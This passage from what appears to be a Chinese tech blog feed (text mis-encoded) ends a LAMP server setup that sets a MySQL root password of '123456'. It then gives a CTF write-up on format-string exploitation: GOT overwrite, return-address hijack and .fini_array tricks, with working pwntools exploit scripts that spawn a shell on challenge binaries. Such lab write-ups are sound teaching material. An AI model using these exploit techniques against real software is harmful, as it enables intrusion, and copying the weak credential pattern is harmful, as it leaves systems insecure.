--user=mysql</code></pre><p>å‘ç°å¡æ­»äº†ï¼š<br><img src="http://qiqianyun.chumen77.xyz/uPic/1KP1pE.png" srcset="/img/loading.gif" alt></p><pre><code>[root@localhost mysql-5.5.23]# ps aux | grep mysql</code></pre><p><img src="http://qiqianyun.chumen77.xyz/uPic/hNLN8i.png" srcset="/img/loading.gif" alt></p><pre><code>[root@localhost mysql-5.5.23]# kill -9 102872[root@localhost mysql-5.5.23]# ps aux | grep mysqlmysql    103111  0.0  4.9 727288 49260 pts/3    Sl   03:39   0:00 /usr/local/mysql/bin/mysqld --basedir=/usr/local/mysql --datadir=/usr/local/mysql/data --plugin-dir=/usr/local/mysql/lib/plugin --user=mysql --log-error=/usr/local/mysql/data/localhost.localdomain.err --pid-file=/usr/local/mysql/data/localhost.localdomain.pid --socket=/tmp/mysql.sock --port=3306root     103201  0.0  0.0 112728   972 pts/2    S+   03:46   0:00 grep --color=auto mysql</code></pre><p>æ€æ‰é‡æ–°æ¥ã€‚<br><img src="http://qiqianyun.chumen77.xyz/uPic/CoNvVo.png" srcset="/img/loading.gif" alt></p><pre><code>[root@localhost mysql]# /usr/local/mysql/scripts/mysql_install_db --user=mysql[root@localhost mysql]# /usr/local/mysql/bin/mysqld_safe --user=mysql</code></pre><p><img src="http://qiqianyun.chumen77.xyz/uPic/a9Mt08.png" srcset="/img/loading.gif" alt><br>æˆåŠŸäº†ã€‚<br><img src="http://qiqianyun.chumen77.xyz/uPic/fUs1Vd.png" srcset="/img/loading.gif" alt></p><h3 id="è‡ªå¯åŠ¨-1"><a href="#è‡ªå¯åŠ¨-1" class="headerlink" title="è‡ªå¯åŠ¨"></a>è‡ªå¯åŠ¨</h3><pre><code>[root@localhost mysql-5.5.23]# vim /etc/rc.d/rc.local</code></pre><p><img src="http://qiqianyun.chumen77.xyz/uPic/HTfqIB.png" srcset="/img/loading.gif" alt></p><h3 id="è®¾ç½®mysqlå¯†ç "><a href="#è®¾ç½®mysqlå¯†ç " class="headerlink" title="è®¾ç½®mysqlå¯†ç "></a>è®¾ç½®mysqlå¯†ç </h3><pre><code>[root@localhost mysql-5.5.23]# /usr/local/mysql/bin/mysqladmin -u root password &quot;123456&quot;[root@localhost mysql-5.5.23]# /usr/local/mysql/bin/mysql -u root -p</code></pre><p><img src="http://qiqianyun.chumen77.xyz/uPic/yHAmIC.png" srcset="/img/loading.gif" alt><br>æˆåŠŸäº†ã€‚æ³¨æ„ <code>history -c</code> æ¸…æ¥šå†å²è®°å½•å‘½ä»¤ã€‚<br><img src="http://qiqianyun.chumen77.xyz/uPic/SeHAFf.png" srcset="/img/loading.gif" alt><br>æœåŠ¡éƒ½æ­£å¸¸ï¼Œå­—ç¬¦é›†æ ¼å¼ä¹Ÿåœ¨ã€‚</p><h2 id="php"><a href="#php" class="headerlink" title="php"></a>php</h2><h3 id="å‡†å¤‡å·¥ä½œ-2"><a href="#å‡†å¤‡å·¥ä½œ-2" class="headerlink" title="å‡†å¤‡å·¥ä½œ"></a>å‡†å¤‡å·¥ä½œ</h3><pre><code>[root@localhost mysql]# yum -y install libtool*[root@localhost local]# yum -y install libpng-devel</code></pre><p>è®©phpæ”¯æŒæ•°æ®åº“çš„å†…å®¹ï¼š</p><pre><code>[root@localhost mysql]# vim /usr/local/gd2/include/gd_io.h</code></pre><p><img src="http://qiqianyun.chumen77.xyz/uPic/MGWJ0l.png" srcset="/img/loading.gif" alt></p><h3 id="å¼€å§‹å®‰è£…-1"><a href="#å¼€å§‹å®‰è£…-1" class="headerlink" title="å¼€å§‹å®‰è£…"></a>å¼€å§‹å®‰è£…</h3><pre><code>[root@localhost php-5.4.25]# ./configure --prefix=/usr/local/php/ --with-config-file-path=/usr/local/php/etc/ --with-apxs2=/usr/local/apache2/bin/apxs --with-mysql=/usr/local/mysql --with-libxml-dir=/usr/local/libxml2 --with-jpeg-dir=/usr/local/jpeg6/ --with-png-dir=/usr/local/libpng/ --with-freetype-dir=/usr/local/freetype/ --with-gd=/usr/local/gd2/ --with-mcrypt=/usr/local/libmcrypt/ --with-mysqli=/usr/local/mysql/bin/mysql_config --enable-soap --enable-mbstring=all --enable-sockets --with-pdo-mysql=/usr/local/mysql --without-pear</code></pre><p><img src="http://qiqianyun.chumen77.xyz/uPic/6P6yZd.png" srcset="/img/loading.gif" alt></p><pre><code>[root@localhost php-5.4.25]# make</code></pre><p><img src="http://qiqianyun.chumen77.xyz/uPic/1rlM0o.png" srcset="/img/loading.gif" alt></p><pre><code>[root@localhost php-5.4.25]# make install</code></pre><p><img src="http://qiqianyun.chumen77.xyz/uPic/PcwG4a.png" srcset="/img/loading.gif" alt></p><h3 id="é…ç½®"><a href="#é…ç½®" class="headerlink" title="é…ç½®"></a>é…ç½®</h3><pre><code>[root@localhost php-5.4.25]# mkdir /usr/local/php/etc[root@localhost php-5.4.25]# cp php.ini-production /usr/local/php/etc/php.ini</code></pre><p>å¤åˆ¶ä¸»é…ç½®æ–‡ä»¶åˆ°<code>/usr/local/php/etc</code></p><pre><code>[root@localhost php-5.4.25]# vi /usr/local/apache2/etc/httpd.conf</code></pre><p><img src="http://qiqianyun.chumen77.xyz/uPic/v9mdSe.png" srcset="/img/loading.gif" alt><br>ä¿®æ”¹apache2é…ç½®ï¼Œè®©å…¶ä¹Ÿå¯ä»¥æ”¯æŒphp</p><p>é‡å¯apache2:</p><pre><code>[root@localhost php-5.4.25]# /usr/local/apache2/bin/apachectl stopAH00558: httpd: Could not reliably determine the server&#39;s fully qualified domain name, using localhost.localdomain. Set the &#39;ServerName&#39; directive globally to suppress this message[root@localhost php-5.4.25]# /usr/local/apache2/bin/apachectl startAH00558: httpd: Could not reliably determine the server&#39;s fully qualified domain name, using localhost.localdomain. Set the &#39;ServerName&#39; directive globally to suppress this message</code></pre><p>restart å¯èƒ½æ˜¯æ— æ•ˆçš„ã€‚</p><h3 id="éªŒè¯"><a href="#éªŒè¯" class="headerlink" title="éªŒè¯"></a>éªŒè¯</h3><h4 id="apacheä¸php"><a href="#apacheä¸php" class="headerlink" title="apacheä¸php"></a>apacheä¸php</h4><p><img src="http://qiqianyun.chumen77.xyz/uPic/Jp7nIv.png" srcset="/img/loading.gif" alt></p><pre><code>[root@localhost htdocs]# vi index.php</code></pre><p>å†™ä¸€ä¸ªphpæ¢é’ˆï¼š</p><pre><code>&lt;?php        phpinfo();?&gt;</code></pre><p><img src="http://qiqianyun.chumen77.xyz/uPic/zgJ5wo.png" srcset="/img/loading.gif" alt></p><h4 id="apacheä¸MySQL"><a href="#apacheä¸MySQL" class="headerlink" title="apacheä¸MySQL"></a>apacheä¸MySQL</h4><pre><code class="php">&lt;?php$link=mysql_connect(&#39;localhost&#39;,&#39;root&#39;,&#39;123456&#39;);if($link) echo &quot;Congratulations!!!!!!&quot;;mysql_close();?&gt;</code></pre><p><img src="http://qiqianyun.chumen77.xyz/uPic/RQRH44.png" srcset="/img/loading.gif" alt></p><h3 id="phpadminæ­å»º"><a href="#phpadminæ­å»º" class="headerlink" title="phpadminæ­å»º"></a>phpadminæ­å»º</h3><pre><code>[root@localhost lamp1]# cp -r phpMyAdmin-4.1.4-all-languages /usr/local/apache2/htdocs/phpmyadmin</code></pre><h4 id="é…ç½®æ–‡ä»¶"><a href="#é…ç½®æ–‡ä»¶" class="headerlink" title="é…ç½®æ–‡ä»¶"></a>é…ç½®æ–‡ä»¶</h4><pre><code>[root@localhost phpmyadmin]# cp config.sample.inc.php config.inc.php[root@localhost phpmyadmin]# vi config.inc.php</code></pre><p><img src="http://qiqianyun.chumen77.xyz/uPic/T9QoLf.png" srcset="/img/loading.gif" alt><br>è®¿é—®æµ‹è¯•ï¼š<br><img src="http://qiqianyun.chumen77.xyz/uPic/UK2Vd0.png" srcset="/img/loading.gif" alt></p>]]></content>
    
    
    
    <tags>
      
      <tag>linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´å°æ€»ç»“ï¼ˆä¸‹ï¼‰</title>
    <link href="/2020/04/03/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%B0%8F%E6%80%BB%E7%BB%93%EF%BC%88%E4%B8%8B%EF%BC%89/"/>
    <url>/2020/04/03/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%B0%8F%E6%80%BB%E7%BB%93%EF%BC%88%E4%B8%8B%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1 id="æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´å°æ€»ç»“ï¼ˆä¸‹ï¼‰"><a href="#æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´å°æ€»ç»“ï¼ˆä¸‹ï¼‰" class="headerlink" title="æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´å°æ€»ç»“ï¼ˆä¸‹ï¼‰"></a>æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´å°æ€»ç»“ï¼ˆä¸‹ï¼‰</h1><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>æ¥ç€ä¸Šä¸€ç¯‡ï¼Œè¿™ä¸€ç¯‡ä¸»è¦è®°å½•ä¸€ä¸‹å¯¹äºè¿™ä¸ªæ¼æ´çš„åˆ©ç”¨å’Œctfèµ›é¢˜ä¸­å¸¸è§çš„å¥—è·¯å’Œè€ƒæ³•ã€‚</p><h2 id="æ ¼å¼åŒ–å­—ç¬¦ä¸²åœ¨æ ˆä¸Š"><a href="#æ ¼å¼åŒ–å­—ç¬¦ä¸²åœ¨æ ˆä¸Š" class="headerlink" title="æ ¼å¼åŒ–å­—ç¬¦ä¸²åœ¨æ ˆä¸Š"></a>æ ¼å¼åŒ–å­—ç¬¦ä¸²åœ¨æ ˆä¸Š</h2><h3 id="åŠ«æŒgot"><a href="#åŠ«æŒgot" class="headerlink" title="åŠ«æŒgot"></a>åŠ«æŒgot</h3><ul><li>æ¯æ¬¡ call libc ä¸­çš„å‡½æ•°æ—¶éƒ½ä¼šå»GOTè¡¨ä¸­æŸ¥è¯¢æ¥æ‰¾å‡ºç¨‹åºä¸‹ä¸€æ­¥è¦jmpçš„ä½å€</li><li>å¯ä»¥é€šè¿‡ fmt æ„é€ å†™å…¥ä¸€ä¸ªç›®æ ‡åœ°å€ï¼Œæ”¹æ‰ GOT è¡¨ä¸Šçš„åœ°å€ä½¿å¾—callè¯¥å‡½æ•°æ—¶å˜æˆjmpåˆ°æˆ‘ä»¬è¦çš„ç›®æ ‡åœ°å€å»<br>ä¾‹å¦‚ ï¼š<br>å°† printf æ”¹æˆ systemï¼ŒåŸæœ¬ printf (â€œshâ€™â€™ï¼‰å°±ç›´æ¥å˜æˆ system (â€œshâ€),ä¾¿å¯ä»¥æ‹¿åˆ°shellã€‚<br>ï¿¼<br><img src="http://qiqianyun.chumen77.xyz/uPic/0G62iR.png" srcset="/img/loading.gif" alt><br>è¿™ä¸€æ”»å‡»è¿‡ç¨‹å¯ä»¥åˆ†ä¸ºä»¥ä¸‹å‡ ä¸ªæ­¥éª¤ï¼š</li><li>ç¡®å®šä¸€ä¸‹printfå‡½æ•°çš„GOTè¡¨çš„åœ°å€ï¼Œå¦‚å›¾ä¸­æ˜¯<code>0x804a010</code></li><li>ç¡®å®šä¸€ä¸‹systemå‡½æ•°çš„å†…å­˜åœ°å€æˆ–è€…pltï¼ˆé€šå¸¸éƒ½éœ€è¦æ³„æ¼ä¸€ä¸‹libcçš„åŸºåœ°å€ï¼Œç„¶ååŠ ä¸Šåç§»ç®—å‡ºï¼Œå½“ç„¶ä¹Ÿä¼šé‡åˆ°ç¨‹åºç›´æ¥å­˜åœ¨systemå‡½æ•°ï¼Œé‚£ä¹ˆå°±æ˜¯pltï¼‰</li><li>åœ¨æ ˆä¸Šæ„é€ å‡ºprintfå‡½æ•°GOTè¡¨çš„åœ°å€</li><li>åˆ©ç”¨fmtæ¼æ´ä¿®æ”¹printfå‡½æ•°GOTè¡¨ä¸Šçš„åœ°å€</li></ul><p>ç„¶åçœ‹ä¸€ä¸ªä¾‹é¢˜ï¼š</p><h4 id="inndy-echo"><a href="#inndy-echo" class="headerlink" title="inndy-echo"></a>inndy-echo</h4><h5 id="ä¿æŠ¤å’Œarch"><a href="#ä¿æŠ¤å’Œarch" class="headerlink" title="ä¿æŠ¤å’Œarch"></a>ä¿æŠ¤å’Œarch</h5><pre><code>    Arch:     i386-32-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x8048000)</code></pre><h5 id="idaåˆ†æ"><a href="#idaåˆ†æ" class="headerlink" title="idaåˆ†æ"></a>idaåˆ†æ</h5><pre><code class="c">int __cdecl __noreturn main(int argc, const char **argv, const char **envp){  char s; // [esp+Ch] [ebp-10Ch]  unsigned int v4; // [esp+10Ch] [ebp-Ch]  v4 = __readgsdword(0x14u);  setvbuf(stdin, 0, 2, 0);  setvbuf(stdout, 0, 2, 0);  do  {    fgets(&amp;s, 256, stdin);    printf(&amp;s);  }  while ( strcmp(&amp;s, &quot;exit\n&quot;) );  system(&quot;echo Goodbye&quot;);  exit(0);}</code></pre><p>å¯ä»¥çœ‹åˆ°ä¼šæ— é™çš„æ‰“å°ä½ è¾“å…¥çš„ä¸œè¥¿ï¼Œé‚£å°±æ„å‘³ç€å¯ä»¥æ— é™æ¬¡è§¦å‘è¿™ä¸ªæ¼æ´ã€‚å¹¶ä¸”è¿˜æœ‰systemè¿™ä¸ªå‡½æ•°ï¼Œé‚£å¯ä»¥ç›´æ¥æ‰¾å…¶pltã€‚</p><h6 id="æ”»å‡»æ€è·¯ï¼š"><a href="#æ”»å‡»æ€è·¯ï¼š" class="headerlink" title="æ”»å‡»æ€è·¯ï¼š"></a>æ”»å‡»æ€è·¯ï¼š</h6><ul><li>åœ¨æ ˆä¸Šæ”¾å¥½printfå‡½æ•°çš„GOTè¡¨åœ°å€ï¼Œå¹¶ç¡®å®šä¸€ä¸‹åç§»</li><li>æ”¹è¿™ä¸ªGOTä¸Šçš„åœ°å€ä¸ºsystemå‡½æ•°çš„plt</li><li>æ”¹å¥½ä¸€ä¼šï¼Œä¼ é€ä¸€ä¸ª<code>/bin/sh</code>ï¼Œæ­¤æ—¶å°±ä¼šå˜æˆ<code>system(/bin/sh)</code></li></ul><p>åœ¨æ‰§è¡Œçš„è¿‡ç¨‹ä¸­éœ€è¦æ³¨æ„ä¸€ä¸‹ï¼Œæ”¹GOTè¡¨ä¸Šçš„å€¼<strong>è¦å•æ¬¡printfå¤šæ¬¡å†™å…¥</strong>ï¼Œå¦åˆ™åªæ”¹ä¸€èˆ¬ç¨‹åºä¼šå‡ºç°æ— æ³•é¢„æ–™çš„æƒ…å†µã€‚è¿˜æœ‰å°±æ˜¯éœ€è¦æ³¨æ„ä¸€ä¸‹<strong>å­—èŠ‚å¯¹é½</strong>ã€‚</p><h5 id="gdbè°ƒè¯•"><a href="#gdbè°ƒè¯•" class="headerlink" title="gdbè°ƒè¯•"></a>gdbè°ƒè¯•</h5><pre><code>gdb-peda$ stack 0x200000| 0xffffd250 --&gt; 0xffffd26c (&quot;AAAA\n&quot;)0004| 0xffffd254 --&gt; 0x1000008| 0xffffd258 --&gt; 0xf7fb25a0 --&gt; 0xfbad208b0012| 0xffffd25c --&gt; 0x00016| 0xffffd260 --&gt; 0xf7ffd000 --&gt; 0x23f400020| 0xffffd264 --&gt; 0x80482e7 (&quot;__libc_start_main&quot;)0024| 0xffffd268 --&gt; 0xf63d4e2e0028| 0xffffd26c (&quot;AAAA\n&quot;)</code></pre><pre><code>gdb-peda$ fmtarg 0xffffd26cThe index of format argument : 7 (&quot;\%6$p&quot;)</code></pre><p>ç¡®å®šåç§»æ˜¯7ï¼Œä½†éœ€è¦æ³¨æ„å­—èŠ‚å¯¹é½ï¼Œæ‰“ç®—ä¸€ä¼šåœ¨å†™payloadæ—¶å€™ï¼Œå°±<code>().ljust</code>è¡¥æˆ0x20çš„<code>a</code>ï¼Œä¹Ÿå°±æ˜¯<code>offset = 7 + 0x20/4 = 15</code></p><h5 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h5><pre><code class="python">from pwn import *context.log_level = &#39;debug&#39;context.arch = &#39;i386&#39;# io = process(&#39;./echo&#39;)io = remote(&#39;node3.buuoj.cn&#39;,26990)system_plt = 0x08048400printf_got = 0x0804A010def fmt_short(prev,val,idx,byte = 2):    result = &quot;&quot;    if prev &lt; val :        result += &quot;%&quot; + str(val - prev) + &quot;c&quot;    elif prev == val :        result += &#39;&#39;    else :        result += &quot;%&quot; + str(256**byte - prev + val) + &quot;c&quot;    result += &quot;%&quot; + str(idx) + &quot;$hn&quot;    return resultprev = 0 payload = &quot;&quot;key = 0x08048400for i in range(2):    payload +=fmt_short(prev,(key &gt;&gt; 16*i) &amp; 0xffff,15+i)     prev = (key &gt;&gt; i*16) &amp; 0xffffpayload = payload.ljust(0x20,&#39;a&#39;) + p32(printf_got) + p32(printf_got+2)raw_input(&#39;-&gt;&#39;)io.sendline(payload)io.send(&#39;/bin/sh\x00&#39;)io.interactive()</code></pre><p>æ¢ä¸€ç§å°±æ˜¯ç”¨pwntoolsä¸­é’ˆå¯¹æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´åˆ©ç”¨æ¨¡å—ä¸­çš„å‡½æ•°<code>fmtstr_payload</code>ï¼Œé¢å¯¹32ä½ï¼Œè¿™ç§æƒ…å†µè¿˜æ˜¯å¾ˆå¥½ç”¨çš„ï¼š</p><pre><code class="python">from pwn import *context.log_level = &#39;debug&#39;context.arch = &#39;i386&#39;# io = process(&#39;./echo&#39;)io = remote(&#39;node3.buuoj.cn&#39;,26990)system_plt = 0x08048400printf_got = 0x0804A010payload = fmtstr_payload(7,{printf_got : system_plt})io.sendline(payload)io.send(&#39;/bin/sh\x00&#39;)io.interactive()</code></pre><p><img src="http://qiqianyun.chumen77.xyz/uPic/TxIVwQ.png" srcset="/img/loading.gif" alt><br>å¯ä»¥çœ‹ä¸€ä¸‹å…¶ç”Ÿæˆçš„payloadï¼ŒæŠŠç›®æ ‡åœ°å€ä¿¡æ¯æ”¾åœ¨å¼€å¤´ï¼Œåœ¨64ä½æ˜¯è‚¯å®šæ˜¯ä¸å¯è¡Œçš„ã€‚ï¼ˆä¸è¿‡å¬è¯´pwntoolsçš„æ–°ç‰ˆæœ¬æ˜¯å·²ç»æ”¯æŒ64ä½äº†ï¼Œä½†æ˜¯æœ¬äººä¸€ç›´æ²¡æœ‰æ›´æ–°æˆåŠŸï¼Œæ‰€ä»¥ä¹Ÿæ²¡æœ‰æµ‹è¯•ï¼‰</p><h3 id="åŠ«æŒretaddress"><a href="#åŠ«æŒretaddress" class="headerlink" title="åŠ«æŒretaddress"></a>åŠ«æŒretaddress</h3><p>é¡¾åæ€è®®ï¼Œå°±æ˜¯åˆ©ç”¨æ ¼å¼åŒ–ä¸²æ¼æ´æ¥ä¿®æ”¹å‡½æ•°çš„è¿”å›åœ°å€åˆ°æˆ‘ä»¬æƒ³è¦jmpçš„åœ°å€ã€‚å¸¸è§å¥—è·¯ï¼š</p><ul><li>jmpåˆ°å¸¦æœ‰<code>system(/bin/sh)</code> çš„åé—¨å‡½æ•°</li><li>ä¸å¼€nxä¿æŠ¤ï¼Œjmpåˆ°è‡ªå·±æ„é€ çš„shellcodeä¸Šã€‚</li><li>æå‰æ³„æ¼libcç®—å‡ºlibcçš„baseï¼Œjmpåˆ°onegadgetåœ°å€</li></ul><p>çœ‹ä¸€ä¸ªç®€å•çš„ä¾‹å­ï¼š</p><h4 id="ä¸‰ä¸ªç™½å¸½-pwnme-k0"><a href="#ä¸‰ä¸ªç™½å¸½-pwnme-k0" class="headerlink" title="ä¸‰ä¸ªç™½å¸½ - pwnme-k0"></a>ä¸‰ä¸ªç™½å¸½ - pwnme-k0</h4><h5 id="ä¿æŠ¤å’Œarch-1"><a href="#ä¿æŠ¤å’Œarch-1" class="headerlink" title="ä¿æŠ¤å’Œarch"></a>ä¿æŠ¤å’Œarch</h5><pre><code>    Arch:     amd64-64-little    RELRO:    Full RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x400000)</code></pre><p>64ä½ç¨‹åºï¼Œä¸”å¼€å¯äº†RELROä¿æŠ¤ï¼Œè¿™æ ·å°±æ— æ³•ä¿®æ”¹gotè¡¨äº†ã€‚</p><h5 id="idaåˆ†æ-1"><a href="#idaåˆ†æ-1" class="headerlink" title="idaåˆ†æ"></a>idaåˆ†æ</h5><p>è¿™ä¸ªç¨‹åºå®ç°äº†ä¸€ä¸ªæ³¨å†Œç”¨æˆ·çš„åŠŸèƒ½ï¼Œæ³¨å†Œå¥½åå¯ä»¥æ¥å±•ç¤ºç”¨æˆ·ä¿¡æ¯ï¼Œä¿®æ”¹ç”¨æˆ·ä¿¡æ¯ï¼Œå’Œé€€å‡ºç¨‹åºã€‚å…¶ä¸­åœ¨å±•ç¤ºç”¨æˆ·ä¿¡æ¯å½“ä¸­ï¼Œå­˜åœ¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼š</p><pre><code class="c">int __fastcall sub_400B07(char format, __int64 a2, __int64 a3, __int64 a4, __int64 a5, __int64 a6, char formata, __int64 a8, __int64 a9){  write(0, &quot;Welc0me to sangebaimao!\n&quot;, 0x1AuLL);  printf(&amp;formata, &quot;Welc0me to sangebaimao!\n&quot;);  return printf(&amp;a9 + 4);}</code></pre><p>å¹¶ä¸”å‘ç°å…¶ä¸­è¾“å‡ºçš„bufå°±æ˜¯ä½ è¾“å…¥çš„å¯†ç ï¼š<br><img src="http://qiqianyun.chumen77.xyz/uPic/o8t1UX.png" srcset="/img/loading.gif" alt></p><p>è¿˜å‘ç°å…¶ä¸­æœ‰ä¸ªåé—¨å‡½æ•°ï¼š<br><img src="http://qiqianyun.chumen77.xyz/uPic/lRHun0.png" srcset="/img/loading.gif" alt></p><p>ä¼šè°ƒç”¨systemå‡½æ•°ç»™ä½ shellï¼Œé‚£æ”»å‡»æ€è·¯ä¹Ÿå°±æ˜¯å»ä¿®æ”¹ç¨‹åºä¸­æŸä¸ªå‡½æ•°çš„è¿”å›åœ°å€ï¼Œç›´æ¥è¿”å›åˆ°è¿™é‡Œå°±æ‹¿åˆ°shelläº†ã€‚</p><h5 id="gdbè°ƒè¯•ï¼š"><a href="#gdbè°ƒè¯•ï¼š" class="headerlink" title="gdbè°ƒè¯•ï¼š"></a>gdbè°ƒè¯•ï¼š</h5><p>å®šä½åˆ°è¿™ä¸ªå­˜åœ¨æ¼æ´çš„printfå½“ä¸­ï¼Œç¡®å®šä¸€ä¸‹ï¼š<br><img src="http://qiqianyun.chumen77.xyz/uPic/MsdWDQ.png" srcset="/img/loading.gif" alt><br>çœ‹ä¸€ä¸‹æ­¤æ—¶çš„æ ˆæƒ…å†µï¼Œè¾“å…¥çš„usenameå¯ä»¥ç¡®å®šåç§»æ˜¯8ï¼Œå¹¶ä¸”rdiä¹Ÿæ˜¯æŒ‡å‘äº†å­˜æ”¾passwordçš„åœ°å€ã€‚</p><p>ç„¶åå‘ç°æ ˆä¸Šä¹Ÿæœ‰å¾ˆå¤šæ ˆçš„åœ°å€ä¿¡æ¯ï¼Œå½“ç¨‹åºç¬¬äºŒæ¬¡è¿è¡Œåˆ°è¿™é‡Œçš„æ—¶å€™ï¼Œå‘ç°è¿™é‡Œespå¯¹åº”çš„åœ°å€ä¿¡æ¯ä¹Ÿæ˜¯ä¸ä¼šå˜çš„ã€‚æ‰€ä»¥å°±å¯ä»¥é€šè¿‡æ³„æ¼è¿™é‡Œçš„å€¼æ¥ç®—å‡ºå­˜æ”¾ret addressçš„æ ˆåœ°å€ã€‚</p><p>ç„¶åè®©ç¨‹åºè¿è¡Œåˆ°ä¿®æ”¹ç”¨æˆ·ä¿¡æ¯çš„å‡½æ•°ï¼Œè¿™ä¸‹æŠŠret addressçš„pointæ”¾åˆ°æ ˆä¸Šï¼Œæ¥ç€å°±å¯ä»¥å¼€å§‹ä¿®æ”¹ret addressçš„å€¼äº†ã€‚</p><h5 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h5><pre><code class="python">from pwn import *context.log_level = &#39;debug&#39;context.arch = &#39;amd64&#39;io = process(&#39;./pwnme_k0&#39;)# context.clear(arch = &#39;amd64&#39;)io.recvuntil(&#39;lenth:20): \n&#39;)io.sendline(&#39;%0006$lx&#39;)io.recvuntil(&#39;lenth:20): \n&#39;)io.sendline(&#39;11111111&#39;)io.recvuntil(&#39;&gt;&#39;)io.sendline(&#39;1&#39;)# io.recvuntil(&#39;Welc0me to sangebaimao!\n&#39;)stack = int(io.recvline_contains(&#39;7f&#39;),16)print(stack)ret_add = stack - 0x38# system_add = 0x04008AApayload = &#39;%2218c%8$hn&#39;io.recvuntil(&#39;&gt;&#39;)io.sendline(&#39;2&#39;)io.recvuntil(&#39;lenth:20): \n&#39;)io.sendline(p64(ret_add))io.recvuntil(&#39;lenth:20): \n&#39;)io.sendline(payload)io.recvuntil(&#39;&gt;&#39;)io.sendline(&#39;1&#39;)io.interactive()</code></pre><h3 id="ä¿®æ”¹FINI-ARRAYåŒº"><a href="#ä¿®æ”¹FINI-ARRAYåŒº" class="headerlink" title="ä¿®æ”¹FINI_ARRAYåŒº"></a>ä¿®æ”¹<code>FINI_ARRAY</code>åŒº</h3><p>åœ¨ä¸Šé¢çš„ä¸¤ä¸ªä¾‹å­ä¸­å¯ä»¥å‘ç°,ä¹‹æ‰€ä»¥èƒ½æˆåŠŸåˆ©ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´getshell,å¾ˆå¤šæ—¶å€™éƒ½æ˜¯å› ä¸ºç¨‹åºä¸­å­˜åœ¨å¾ªç¯ï¼Œè®©æˆ‘ä»¬å¯ä»¥å¤šæ¬¡è§¦å‘æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ã€‚å¦‚æœç¨‹åºä¸­ä¸å­˜åœ¨å¾ªç¯å‘¢?åˆ©ç”¨ROPåŠ«æŒå‡½æ•°è¿”å›åœ°å€åˆ°startå¯ä»¥å®ç°ï¼›å½“å­˜åœ¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´æ—¶ï¼Œä½¿ç”¨è¿™ä¸ªæ¼æ´ä¹Ÿåšåˆ°è¿™ä¸€<br>ç‚¹ã€‚</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/NgjlR4.png" srcset="/img/loading.gif" alt><br>ç®€å•åœ°è¯´,ä¸€ä¸ªç¨‹åºåœ¨è°ƒç”¨ mainå‡½æ•°å‰ä¼šè°ƒç”¨<code>.init</code>æ®µä»£ç å’Œ <code>.init_array</code> æ®µçš„å‡½æ•°æ•°ç»„ä¸­æ¯ä¸€ä¸ªå‡½æ•°æŒ‡é’ˆã€‚åŒæ ·çš„,main å‡½æ•°ç»“æŸåä¹Ÿä¼šè°ƒç”¨<code>.fini</code>æ®µä»£ç å’Œ <code>.fini_arrary</code> æ®µçš„å‡½æ•°æ•°ç»„ä¸­çš„æ¯ä¸€ä¸ªå‡½æ•°æŒ‡é’ˆã€‚</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/ioam7T.png" srcset="/img/loading.gif" alt><br>å…¶ä¸­<code>FINI_ARRAY</code>åŒºï¼šç¨‹åºç»“æŸéœ€è¦ç»è¿‡è¿™é‡Œï¼Œæ˜¯å¯ä»¥ä¿®æ”¹ä¸€ä¸‹è¿™é‡Œçš„ææ„å‡½æ•°ã€‚ä¿®æ”¹<code>.fini_array</code>åŒºçš„ç¬¬ä¸€ä¸ªå…ƒç´ ä¸ºstartï¼Œå°±å¯ä»¥å®ç°è®©ç¨‹åºä»å¤´å†æ¥ä¸€æ¬¡ï¼Œä¹Ÿå°±åˆå¯ä»¥ç”¨ä¸€æ¬¡æ¼æ´ã€‚</p><p>éœ€è¦æ³¨æ„çš„æ˜¯,è¿™ä¸ªåŒºçš„å†…å®¹åœ¨å†æ¬¡ä»startå¼€å§‹æ‰§è¡Œååˆä¼šè¢«ä¿®æ”¹ã€‚</p><h4 id="mma-ctf-2nd-2016-greeting"><a href="#mma-ctf-2nd-2016-greeting" class="headerlink" title="mma-ctf-2nd-2016-greeting"></a>mma-ctf-2nd-2016-greeting</h4><h5 id="ä¿æŠ¤å’Œarch-2"><a href="#ä¿æŠ¤å’Œarch-2" class="headerlink" title="ä¿æŠ¤å’Œarch"></a>ä¿æŠ¤å’Œarch</h5><pre><code>    Arch:     i386-32-little    RELRO:    No RELRO    Stack:    Canary found    NX:       NX enabled    PIE:      No PIE (0x8048000)</code></pre><h5 id="idaåˆ†æ-2"><a href="#idaåˆ†æ-2" class="headerlink" title="idaåˆ†æ"></a>idaåˆ†æ</h5><pre><code class="c">int __cdecl main(int argc, const char **argv, const char **envp){  char s; // [esp+1Ch] [ebp-84h]  char v5; // [esp+5Ch] [ebp-44h]  unsigned int v6; // [esp+9Ch] [ebp-4h]  v6 = __readgsdword(0x14u);  printf(&quot;Please tell me your name... &quot;);  if ( !getnline(&amp;v5, 64) )    return puts(&quot;Don&#39;t ignore me ;( &quot;);  sprintf(&amp;s, &quot;Nice to meet you, %s :)\n&quot;, &amp;v5);  return printf(&amp;s);}</code></pre><p>å‘ç°å‡½æ•°åœ¨è§¦å‘æ 